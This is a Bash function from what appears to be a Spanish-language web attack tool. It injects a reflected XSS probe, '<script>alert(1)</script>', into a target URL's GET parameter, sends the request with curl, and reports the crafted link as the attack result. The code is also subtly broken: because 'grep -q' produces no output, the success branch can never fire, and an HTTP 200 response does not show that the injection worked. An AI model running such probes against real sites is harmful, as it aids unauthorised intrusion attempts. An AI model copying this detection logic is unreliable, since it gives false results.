xss() {
#aqui ejecutamos xss con get, checkear si esta search
if [ -n "$search" ] # | grep 'method=\"GET\"' ]]
then
    slash=$(echo $url | awk -F "/" '{print $NF}')
    word=$(echo $slash | awk -F "=" '{print $1}')
    equal=$(echo $word | awk -F "?" '{print $2}')

    pre=$(echo $url | sed "s/$(echo $slash)//g")


    after=$(echo $slash | awk -F "&" '{print $1}')
    afterr=$(echo $slash | sed "s/$(echo $after)//g")

    ATTACK=$pre"?"$equal"=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"$afterr
    curlio=$(curl -s -i $ATTACK | grep -q "200 OK")
    if [ -n "$curlio" ]
    then
       echo "Haz clic en el siguiente enlace para ver el resultado del ataque: $ATTACK"
    else
       echo "Disculpa, el ataque no ha funcionado."
       'volvermenu'
    fi
else
#avisamos de que ha ocurrido un error, falso positivo
    echo "Error inesperado, cerrando el programa"
    exit 2
fi
}
